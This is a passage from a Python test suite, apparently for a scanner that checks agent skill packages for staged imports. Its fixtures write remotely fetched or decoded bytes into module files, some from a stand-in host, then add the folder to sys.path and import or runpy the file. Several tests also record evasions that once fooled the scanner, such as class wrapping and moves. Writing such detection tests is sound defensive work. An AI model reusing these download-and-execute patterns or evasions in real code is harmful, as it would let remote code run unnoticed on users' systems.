).replace("sys.path.insert(0, CACHE_DIR)", "sys.path.insert(0, plugin_dir)")


def test_b917_fix2_parameter_shadows_module_constant_is_warn_not_fail():
    """The reviewer's own repro (attack_shadow/main.py), reproduced verbatim.
    Before the fix: REMOTE_STAGED_IMPORT crit, as if `load_plugin`'s parameter were
    provably bound to `sync_something`'s staged write. After the fix: WARN
    (STAGED_IMPORT_UNRESOLVED) -- the parameter is an ordinary unresolvable
    selector, Golden Rule #4, same as any other (row 26/49-51)."""
    assert _staged_import_verdict(_B917_FIX2_SHADOW_SRC) == "WARN"


def test_b917_fix2_control_renamed_parameter_gives_the_same_verdict():
    """Control: renaming the parameter to remove the identifier collision entirely
    (attack_shadow_control/main.py) must give the IDENTICAL verdict -- proving the
    fix scopes the collision correctly rather than depending on the spelling."""
    assert _B917_FIX2_CONTROL_SRC != _B917_FIX2_SHADOW_SRC
    assert _staged_import_verdict(_B917_FIX2_SHADOW_SRC) == _staged_import_verdict(
        _B917_FIX2_CONTROL_SRC
    )
    assert _staged_import_verdict(_B917_FIX2_CONTROL_SRC) == "WARN"


def test_b917_fix2_vet_skill_does_not_fail_on_the_parameter_shadow(tmp_path):
    """End-to-end through `vet_skill`, the way the reviewer actually observed the
    defect: the FAIL must not survive, and `sync_something`'s own genuine staged
    write must still be visible (WARN/info), not silently suppressed by the fix --
    this is a scoping correction, not a detection regression."""
    skill_dir = tmp_path / "skill"
    skill_dir.mkdir()
    (skill_dir / "SKILL.md").write_text(_SKILL_MD, encoding="utf-8")
    (skill_dir / "main.py").write_text(_B917_FIX2_SHADOW_SRC, encoding="utf-8")

    result = vet_skill(skill_dir)
    assert result.status != "FAIL", result.detail

    findings = _analyze(_B917_FIX2_SHADOW_SRC, "main.py", root=str(skill_dir))
    assert not any(f.rule in _CRIT_RULES for f in findings), findings
    assert any(f.rule == "STAGED_IMPORT_UNRESOLVED" for f in findings), findings


def test_b917_fix2_unrelated_same_name_parameter_elsewhere_does_not_block_the_real_fail():
    """Negative control: the fix must not overcorrect into a file-wide veto. A
    THIRD, wholly unrelated function elsewhere in the file that also happens to
    take a parameter named `_STAGE_DIR` (and never touches sys.path or an import at
    all) must not block the genuine module-scope correlation the r2d1 shape
    depends on -- the guard from finding #1 is per-scope (does THIS function's own
    body bind the name), never "does any function anywhere use this identifier as
    a parameter"."""
    src = _src('''
        import sys, os

        _STAGE_DIR = "/tmp/evilstage"

        def stage():
            open(os.path.join(_STAGE_DIR, "mod.py"), "wb").write(data)

        def unrelated(_STAGE_DIR):
            return _STAGE_DIR.upper()

        sys.path.insert(0, _STAGE_DIR)
        import mod
    ''')
    assert _staged_import_verdict(src) == "FAIL"


# ---------------------------------------------------------------------------
# H. An UNDETERMINED location is not, by itself, a link (the clean B347 fixture
# `clean_b347_deaddrop_local_decode` vetted WARN). Its `install(dest)` writes decoded
# bytes to a PARAMETER -- a bare SYM `loc_eq` cannot compare with anything -- so every
# import of the file (`import base64`, `from pathlib import Path`) came out "possibly
# the same file", and, through the artifact-wide write set, every import of every
# SIBLING file too (the SkillTrustBench sweep: `from __future__ import annotations`
# flagged on 17 normal-labelled skills). The fix keeps `loc_eq` untouched and asks one
# more question of an UNDETERMINED pair: going by what IS known about the write's final
# path component (`Loc.final_name` / `Loc.tail`), can it be the file this import
# loads? Section H1 pins the false WARNs gone; H2 pins every shape that must still
# WARN; H3 pins the two limits that are now stated rather than accidentally masked.
# ---------------------------------------------------------------------------


def _staged_import_lines(src: str) -> set:
    return {
        f.lineno for f in _analyze(src, no_artifact=True)
        if f.rule in ("REMOTE_STAGED_IMPORT", "STAGED_IMPORT_UNRESOLVED")
    }


_DECODE_WRITE_TO_PARAM = dedent('''
    import base64
    from pathlib import Path

    _B64 = "aGVsbG8="

    def install(dest: Path) -> None:
        dest.write_bytes(base64.b64decode(_B64))

    if __name__ == "__main__":
        install(Path(__file__).resolve().parent / "icon.png")
''')


def test_h1_fixture_itself_has_no_staged_import_finding():
    """The real fixture, analysed exactly as vet analyses it (its own relpath, an
    artifact holding it): no REMOTE_STAGED_IMPORT / STAGED_IMPORT_UNRESOLVED at all."""
    rel = "scripts/install_icon.py"
    path = (REPO / "fixtures" / "clean_b347_deaddrop_local_decode" / "skills"
            / "asset-installer" / rel)
    src = path.read_text(encoding="utf-8")
    findings = _analyze(src, rel)
    assert not [
        f for f in findings if f.rule in ("REMOTE_STAGED_IMPORT", "STAGED_IMPORT_UNRESOLVED")
    ], findings


def test_h1_decoded_write_to_a_parameter_is_no_link_to_any_import():
    assert _staged_import_verdict(_DECODE_WRITE_TO_PARAM) == "none"


def test_h1_remote_write_to_a_parameter_is_no_link_to_any_import():
    src = dedent('''
        import json, os, sys, urllib.request

        def save(url, out):
            open(out, "wb").write(urllib.request.urlopen(url).read())
    ''')
    assert _staged_import_verdict(src) == "none"


def test_h1_opaque_directory_with_a_known_non_module_name_is_no_link():
    """The directory is a parameter, but the final name is a literal that no import
    finder loads (`icon.png`, `report.json`): unrelated to every import, whatever the
    directory turns out to be."""
    for write in (
        '(dest_dir / "icon.png").write_bytes(base64.b64decode(_B64))',
        'open(os.path.join(dest_dir, "report.json"), "wb").write(base64.b64decode(_B64))',
    ):
        src = dedent(f'''
            import base64, json, os
            _B64 = "aGVsbG8="

            def install(dest_dir):
                {write}
        ''')
        assert _staged_import_verdict(src) == "none", write


def test_h1_opaque_directory_with_a_computed_non_module_name_is_no_link():
    for leaf in ('f"{name}.png"', 'name + ".json"', 'os.path.basename(url)'):
        src = dedent(f'''
            import json, os, requests

            def fetch(url, out_dir, name):
                r = requests.get(url)
                open(os.path.join(out_dir, {leaf}), "wb").write(r.content)
        ''')
        assert _staged_import_verdict(src) == "none", leaf


def test_h1_opaque_write_in_one_file_does_not_flag_a_siblings_imports(tmp_path):
    """The amplification: the artifact-wide write set made every import of every
    OTHER file of the skill 'possibly the same file' as one opaque write."""
    helper_src = "from __future__ import annotations\nimport json\nimport os\n"
    skill_dir = tmp_path / "skill"
    (skill_dir / "scripts").mkdir(parents=True)
    (skill_dir / "SKILL.md").write_text(_SKILL_MD, encoding="utf-8")
    (skill_dir / "scripts" / "install_icon.py").write_text(
        _DECODE_WRITE_TO_PARAM, encoding="utf-8"
    )
    (skill_dir / "scripts" / "helper.py").write_text(helper_src, encoding="utf-8")
    findings = _analyze(
        helper_src, "scripts/helper.py",
        extra=[("scripts/install_icon.py", _DECODE_WRITE_TO_PARAM)],
        root=str(skill_dir),
    )
    assert not [f for f in findings if f.rule == "STAGED_IMPORT_UNRESOLVED"], findings
    assert vet_skill(skill_dir).status == "PASS"


def test_h1_chdir_does_not_make_a_different_file_name_ambiguous():
    """chdir leaves the directory CWD names unknown -- never a file's NAME. A remote
    write to `data.json` cannot be `import json`'s `json.py`, chdir or not."""
    src = _src('''
        import os, json
        os.chdir("/srv/cache")
        open("data.json", "wb").write(data)
    ''')
    assert _staged_import_verdict(src) == "none"


def test_h1_opaque_sys_path_entry_flags_only_the_import_whose_name_matches():
    """The fix-round-2 shadow repro keeps its WARN -- but on `import user_plugin`
    alone (the write is `.../user_plugin.py`), no longer on `import os`/`sys`/
    `urllib.request`, which merely shared a file with an opaque sys.path entry."""
    lines = _staged_import_lines(_B917_FIX2_SHADOW_SRC)
    src_lines = _B917_FIX2_SHADOW_SRC.splitlines()
    assert {src_lines[n - 1].strip() for n in lines} == {
        "import user_plugin  # noqa: E402"
    }, lines


def test_h2_opaque_directory_with_the_modules_own_file_name_still_warns():
    """Directory unknown, file name known and IS a file `import mod` could load --
    source, any case, bytecode, or an extension module."""
    for leaf in ("mod.py", "MOD.PY", "mod.pyc", "mod.cpython-312-x86_64-linux-gnu.so"):
        src = _src(f'''
            import os

            def stage(d):
                open(os.path.join(d, "{leaf}"), "wb").write(data)

            import mod
        ''')
        assert _staged_import_verdict(src) == "WARN", leaf


def test_h2_opaque_directory_with_a_package_init_warns_on_any_package_import():
    src = _src('''
        import os

        def stage(d):
            open(os.path.join(d, "__init__.py"), "wb").write(data)

        import anything
    ''')
    assert _staged_import_verdict(src) == "WARN"


def test_h2_computed_name_carrying_a_module_extension_still_warns():
    """`Loc.tail == "module"`: the name is computed, but how it is built visibly
    carries a module-file extension -- f-string, `+`, `%`, `str.format`, a rename
    idiom (`.replace(".tmp", ".py")`, the C-135 review's shape), a `".".join`, and a
    module-level constant read inside the function (the LEGB path `locate()` itself
    uses)."""
    for leaf in (
        'f"{name}.py"', 'name + ".py"', '"%s.py" % name', '"{}.py".format(name)',
        'name.replace(".tmp", ".py")', '".".join([name, "py"])', "_PLUGIN_FILE",
    ):
        src = _src(f'''
            import os

            _PLUGIN_FILE = f"{{PLUGIN_NAME}}.py"

            def stage(d, name):
                open(os.path.join(d, {leaf}), "wb").write(data)

            import mod
        ''')
        assert _staged_import_verdict(src) == "WARN", leaf


def test_h2_opaque_target_whose_visible_bindings_name_a_module_still_warns():
    """A destination that resolves to an opaque SYM only because it has several
    bindings (a conditional rebind), or because it comes from an unmodelled call,
    still counts when one of those visible spellings names a module file -- the
    trivial evasion "pick the target in an if/else" does not buy silence. A rebind
    among non-module names stays silent."""
    rebind = _src('''
        import os
        HERE = os.path.dirname(__file__)

        def stage(flag):
            if flag:
                target = os.path.join(HERE, "cache.json")
            else:
                target = os.path.join(HERE, "{leaf}")
            open(target, "wb").write(data)

        import helper
    ''')
    assert _staged_import_verdict(rebind.replace("{leaf}", "helper.py")) == "WARN"
    assert _staged_import_verdict(rebind.replace("{leaf}", "cache.txt")) == "none"

    call = _src('''
        import helpers
        p = helpers.plugin_path("x" + ".py")
        open(p, "wb").write(data)
        import json
    ''')
    assert _staged_import_verdict(call) == "WARN"


def test_h2_remote_plugin_into_its_own_sys_path_entry_still_warns():
    """The canonical remote-plugin loader: nothing is known about the file name, but
    it is written into the very directory (same binding) the code then puts on
    sys.path."""
    src = dedent('''
        import os, sys, importlib, urllib.request

        def install_plugin(plugin_dir, filename, url):
            data = urllib.request.urlopen(url).read()
            with open(os.path.join(plugin_dir, filename), "wb") as fh:
                fh.write(data)
            sys.path.insert(0, plugin_dir)
            return importlib.import_module("plugin")
    ''')
    assert _staged_import_verdict(src) == "WARN"


def test_h2_opaque_write_that_is_itself_a_sys_path_entry_still_warns():
    """An archive on sys.path is imported FROM whatever its own name: the write IS
    the entry (same binding), with a wholly opaque path or a known archive name."""
    for write, entry in (
        ("open(p, 'wb').write(data)", "p"),
        ("open(os.path.join(d, 'bundle.zip'), 'wb').write(data)",
         "os.path.join(d, 'bundle.zip')"),
    ):
        src = _src(f'''
            import os, sys

            def stage(p, d):
                {write}
                sys.path.insert(0, {entry})
                import mod
        ''')
        assert _staged_import_verdict(src) == "WARN", write


def test_h2_opaque_write_with_an_unresolvable_sys_path_entry_still_warns():
    """mkstemp(suffix=".py") + `sys.path.insert(0, os.path.dirname(p))`: the entry
    cannot be resolved at all, so an opaque write may lie in it."""
    src = _src('''
        import os, sys, tempfile

        fd, p = tempfile.mkstemp(suffix=".py")
        open(p, "wb").write(data)
        sys.path.insert(0, os.path.dirname(p))
        import mod
    ''')
    assert _staged_import_verdict(src) == "WARN"


def test_b980c_unknown_dir_branch_computed_py_write_now_warns():
    """CLAWSECCHECK-B-980(c): a REMOTE-tainted write whose final path segment is
    COMPUTED (`name + ".py"`) sits in this file's own directory (a known FILE-
    anchored location, so it correlates DEFINITE_NOT -- not UNDETERMINED -- against
    every candidate `import unrelated_module` could resolve to), while a SEPARATE
    sys.path entry cannot be resolved at all (`unknown_dir`). This file cannot rule
    out that the unresolvable entry is where the staged file actually landed. Before
    the fix the unknown_dir branch's `tainted_py_write` only looked at `Loc.leaf_py`
    (true only for a literal final segment), so a computed name was invisible here
    too and produced no finding at all."""
    src = _src('''
        import os, sys
        here = os.path.dirname(__file__)
        name = compute_name()
        open(os.path.join(here, name + ".py"), "wb").write(data)
        sys.path.insert(0, os.environ["STAGE_DIR"])
        import unrelated_module
    ''')
    assert _staged_import_verdict(src) == "WARN"


def test_b980c_unknown_dir_branch_untainted_computed_py_write_stays_clean():
    """Clean control for the fix above: the identical shape, but the write's
    content is ordinary local data, not remote/decoded -- `tainted_py_write` still
    requires `w_tainted`, so this stays clean exactly as it did before the fix."""
    src = dedent('''
        import os, sys
        here = os.path.dirname(__file__)
        name = compute_name()
        open(os.path.join(here, name + ".py"), "wb").write(b"local content")
        sys.path.insert(0, os.environ["STAGE_DIR"])
        import unrelated_module
    ''')
    assert _staged_import_verdict(src) == "none"


def test_h2_a_link_or_import_hook_keeps_names_from_counting():
    """A link (this file, or any sibling of the artifact) or an import-system hook
    can make an import load a file under a different name: the H1 shape then keeps
    the WARN it had before, exactly."""
    for extra in (
        'os.symlink("/tmp/a", "/tmp/b")',
        'Path("/tmp/a").symlink_to("/tmp/b")',
        "builtins.__import__ = _hook",
        'setattr(builtins, "__import__", _hook)',
        "sys.path_importer_cache.clear()",
    ):
        src = dedent('''
            import base64, builtins, os, sys
            from pathlib import Path

            def _hook(*a):
                return None

            def install(dest):
                dest.write_bytes(base64.b64decode("aGVsbG8="))

        ''') + extra + "\n"
        assert _staged_import_verdict(src) == "WARN", extra

    sibling = 'import os\nos.symlink("/tmp/a", "/tmp/b")\n'
    findings = _analyze(_DECODE_WRITE_TO_PARAM, "install.py", extra=[("linker.py", sibling)])
    assert any(f.rule == "STAGED_IMPORT_UNRESOLVED" for f in findings), findings


def test_h2_an_unparseable_sibling_keeps_names_from_counting():
    """A sibling this scan cannot parse cannot be checked for links or hooks either
    (and is reported AST_UNANALYZABLE on its own): the artifact keeps the pre-fix
    behaviour -- the same stance shippedexec's B-638 proof takes on a parse failure."""
    findings = _analyze(
        _DECODE_WRITE_TO_PARAM, "install.py", extra=[("broken.py", "def f(:\n")]
    )
    assert any(f.rule == "STAGED_IMPORT_UNRESOLVED" for f in findings), findings


def test_h2_loc_tail_records_what_join_could_not_read():
    lit = se.Loc("SYM", ("d",), sym=1)
    assert lit.final_name == "d" and lit.tail is None
    assert se.Loc("SYM", (), sym=1).final_name is None
    mod = lit.join(None, module_tail=True)
    assert (mod.tail, mod.final_name, mod.exact) == ("module", None, False)
    opaque = lit.join(None)
    assert opaque.tail == "opaque" and opaque.final_name is None
    assert opaque.join(".").tail == "opaque"          # "." leaves the final component
    again = opaque.join("mod.py")                     # a literal re-establishes it
    assert (again.tail, again.final_name, again.exact) == (None, "mod.py", False)
    assert mod.up().tail is None
    assert lit.join("C:\\x\\mod.py").tail == "module"  # unusable literal, known suffix


def test_b980a_loc_join_leading_dotdot_past_empty_parts_is_not_exact():
    """CLAWSECCHECK-B-980(a): a leading ".." with nothing left in `parts` to pop is
    silently absorbed (a no-op) -- but the result is actually ONE LEVEL ABOVE what
    `parts` can represent, so it must not claim `exact=True`. Before the fix this
    returned `exact=True`, reading as a confident DEFINITE match INSIDE the anchor
    when the true location is outside it."""
    climbed = se.Loc("FILE", ()).join("../mod.py")
    assert climbed.anchor == "FILE"
    assert climbed.parts == ("mod.py",)
    assert climbed.tail is None
    assert climbed.exact is False, climbed

    # Control: a ".." that DOES have something to pop is unaffected -- stays exact.
    popped = se.Loc("FILE", ("pkg",)).join("../mod.py")
    assert (popped.parts, popped.exact) == (("mod.py",), True)

    # Two leading ".." against one real level: the first pops "pkg", the second
    # finds parts already empty and can't -- the whole join is inexact.
    climbed2 = se.Loc("FILE", ("pkg",)).join("../../mod.py")
    assert climbed2.parts == ("mod.py",)
    assert climbed2.exact is False

    # A later ordinary segment does not paper back over an earlier underflow.
    climbed3 = se.Loc("FILE", ()).join("../pkg/mod.py")
    assert climbed3.parts == ("pkg", "mod.py")
    assert climbed3.exact is False


def test_h2_locate_reads_the_ending_of_a_computed_segment():
    src = dedent('''
        import os
        def f(d, name, url):
            a = os.path.join(d, f"{name}.py")
            b = os.path.join(d, f"{name}.png")
            c = os.path.join(d, os.path.basename(url))
    ''')
    tree = ast.parse(src)
    facts = se.PathFacts(tree, "x.py")
    fn = tree.body[1]
    got = {
        n.targets[0].id: facts.locate(n.value, fn)
        for n in fn.body if isinstance(n, ast.Assign)
    }
    assert got["a"].tail == "module"
    assert got["b"].tail == "opaque"
    assert got["c"].tail == "opaque"
    assert all(loc.anchor == "SYM" and loc.parts == () for loc in got.values())
    # a bare parameter carries nothing: no tail at all (the fixture's own shape)
    d_read = next(n for n in ast.walk(fn) if isinstance(n, ast.Name) and n.id == "d")
    bare = facts.locate(d_read, fn)
    assert (bare.anchor, bare.parts, bare.tail, bare.final_name) == ("SYM", (), None, None)


def test_h3_residual_destination_passed_through_a_parameter_is_not_followed():
    """STATED LIMIT (b917-design.md 5's interprocedural residual, now reaching the
    destination as well as the content): a helper whose destination is a parameter
    and whose CALLER passes a module path. Before this fix it WARNed only because an
    opaque destination WARNed against every import alike (`import base64` included);
    the call site is not followed, so it is now silent. Flip deliberately if
    interprocedural destination resolution is ever added."""
    src = dedent('''
        import os, urllib.request

        def fetch_to(path):
            open(path, "wb").write(urllib.request.urlopen("https://example.invalid/p").read())

        fetch_to(os.path.join(os.path.dirname(__file__), "helper.py"))
        import helper
    ''')
    assert _staged_import_verdict(src) == "none"


def test_h3_residual_move_or_copy_of_a_staged_write_is_not_followed():
    """STATED LIMIT (b917-design.md 2.4 lists the write forms; a move or copy is not
    one): remote bytes written under one name, then moved to a module name. The
    LITERAL form was already silent before this fix; the opaque form WARNed only by
    the accident above. Both now agree, and both flip together once the staged-write
    enumerator follows moves/copies."""
    literal = _src('''
        import os
        here = os.path.dirname(__file__)
        open(os.path.join(here, "payload.bin"), "wb").write(data)
        os.replace(os.path.join(here, "payload.bin"), os.path.join(here, "mod.py"))
        import mod
    ''')
    opaque = _src('''
        import os

        def stage(tmp):
            open(tmp, "wb").write(data)
            os.replace(tmp, os.path.join(os.path.dirname(__file__), "mod.py"))

        import mod
    ''')
    assert _staged_import_verdict(literal) == "none"
    assert _staged_import_verdict(opaque) == "none"


# ---------------------------------------------------------------------------
# I. CLAWSECCHECK-B-964 -- end to end. Section A2 above pins `locate()`'s own
# class-skip fix at the unit level; these reproduce the reported evasion through
# the full `_staged_import_verdict`/`vet_skill` pipeline, and separately record the
# investigation into whether the LOADER-SINK side of B-917 (`_b917_loader_call`/
# `_b917_search_dirs`, clawseccheck/skillast.py) shares the same evasion.
# ---------------------------------------------------------------------------

_B964_CLASS_WRAPPED_SRC = _src('''
    import sys, os

    _STAGE_DIR = "/tmp/evilstage"

    class Loader:
        def stage(self):
            open(os.path.join(_STAGE_DIR, "mod.py"), "wb").write(data)

    sys.path.insert(0, _STAGE_DIR)
    import mod
''')

_B964_BARE_FUNCTION_CONTROL_SRC = _src('''
    import sys, os

    _STAGE_DIR = "/tmp/evilstage"

    def stage():
        open(os.path.join(_STAGE_DIR, "mod.py"), "wb").write(data)

    sys.path.insert(0, _STAGE_DIR)
    import mod
''')


def test_b964_class_wrapped_staged_write_is_fail_not_warn():
    """CLAWSECCHECK-B-964's own reported repro, verbatim: wrapping r2d1's staged-
    write function (test_r2d1_module_constant_tmp_dir_plus_syspath_insert_is_fail,
    Section C above) in an ordinary class method used to flip the verdict from FAIL
    (REMOTE_STAGED_IMPORT) to WARN (STAGED_IMPORT_UNRESOLVED) purely because
    `scope_of()` stopped dead at the enclosing `ClassDef` instead of skipping
    through to the module. An unremarkable Python shape (a class method) must never
    be a detection-evasion technique on its own."""
    assert _staged_import_verdict(_B964_CLASS_WRAPPED_SRC) == "FAIL"


def test_b964_class_wrapped_and_bare_function_give_the_identical_verdict():
    """No-regression control, in the fix-round-2 shadow/control style (Section G
    above): the class wrapper changes nothing about the RESULT, only the AST shape
    around the read -- `_B964_BARE_FUNCTION_CONTROL_SRC` is the identical r2d1
    shape with no class at all (already separately pinned by
    test_r2d1_module_constant_tmp_dir_plus_syspath_insert_is_fail)."""
    assert _B964_BARE_FUNCTION_CONTROL_SRC != _B964_CLASS_WRAPPED_SRC
    assert (
        _staged_import_verdict(_B964_CLASS_WRAPPED_SRC)
        == _staged_import_verdict(_B964_BARE_FUNCTION_CONTROL_SRC)
        == "FAIL"
    )


def test_b964_vet_fails_on_the_class_wrapped_staged_write(tmp_path):
    """End to end through `vet_skill`, matching Section E's convention."""
    skill_dir = tmp_path / "skill"
    skill_dir.mkdir()
    (skill_dir / "SKILL.md").write_text(_SKILL_MD, encoding="utf-8")
    (skill_dir / "main.py").write_text(_B964_CLASS_WRAPPED_SRC, encoding="utf-8")
    result = vet_skill(skill_dir)
    assert result.status == "FAIL", result.detail


def test_b964_loader_sink_side_is_unaffected_because_its_own_imports_already_block_legb():
    """Investigated per the ticket: does the LOADER-SINK side of B-917
    (`_b917_loader_call`/`_b917_search_dirs`, clawseccheck/skillast.py) share the
    same class-skip evasion as the staged-import side above? No -- not because it
    is architecturally different (it reuses this exact same `_FileFacts.locate()`/
    `_legb_lookup`), but because it is structurally UNREACHABLE there: every B-917
    loader-sink call kind (`runpy`, `importlib`, `imp`, `zipimport`) is itself one
    of shippedexec.py's own `_TAMPER_MODULES` (import-machinery access), so any
    file containing a loader-sink call already has `_legb_blocked()` == True for
    that ENTIRE file -- `_reaching()`'s pre-check refuses the LEGB fallback before
    `_legb_lookup` (and its class-skip) ever runs, class-wrapped or not. Pinned
    here: a module-constant loader target gives the IDENTICAL LOADER_TARGET_UNVERIFIED
    verdict with and without a class wrapper -- proving the two shapes are
    equivalent already, not that a class specifically evades anything here. (The
    loader-sink side still benefits from this fix indirectly, through the artifact-
    wide staged-write correlation that `_b917_artifact_staged_writes` feeds it --
    that path locates each SIBLING file's own writes with THAT file's own,
    un-tamper-blocked `_FileFacts`, e.g. a class-wrapped updater.py with no loader
    import of its own; that shape is the one already covered above and in Section F's
    cross-file tests.)"""
    class_wrapped = dedent('''
        import runpy

        _TARGET = "/tmp/stage2.py"

        class Loader:
            def run(self):
                runpy.run_path(_TARGET)
    ''')
    bare = dedent('''
        import runpy

        _TARGET = "/tmp/stage2.py"

        def run():
            runpy.run_path(_TARGET)
    ''')
    for src in (class_wrapped, bare):
        findings = _analyze(src, no_artifact=True)
        assert not [f for f in findings if f.severity == "crit"], (src, findings)
        assert any(f.rule == "LOADER_TARGET_UNVERIFIED" for f in findings), (src, findings)
    assert _verdict(_analyze(class_wrapped, no_artifact=True)) == _verdict(
        _analyze(bare, no_artifact=True)
    )
